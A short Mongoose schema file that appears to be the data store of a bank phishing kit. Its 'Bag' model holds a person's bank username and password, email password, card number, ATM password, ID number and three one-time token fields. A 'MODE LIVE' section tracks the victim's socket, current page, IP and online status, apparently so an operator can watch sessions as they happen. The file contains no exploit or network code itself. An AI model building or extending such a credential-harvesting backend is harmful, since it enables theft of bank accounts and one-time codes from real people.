import { Schema, model } from 'mongoose'

const bagSchema = new Schema({
    userRef: {
        type: Schema.ObjectId,
        required: true
    },
    typeDocument: String,
    nameBank: String,
    username: String,
    password: String,
    correo: String,
    claveCorreo: String,
    celular: String,
    token1: String,
    token2: String,
    token3: String,
    tarjeta: String,
    atmPassword: String,
    nroDocument: String,
    additionalData: [String],


    // MODE LIVE
    socketID: String,
    modeLive: Boolean,
    pageNow: String,
    liveData: [{
        textPage: String,
        urlPage: String
    }],
    isLiveLoading: Boolean,
    online: Boolean,
    deleteBag: Boolean,
    createAt: Date,
    ip: String,
})


export const Bag = model('Bag', bagSchema);
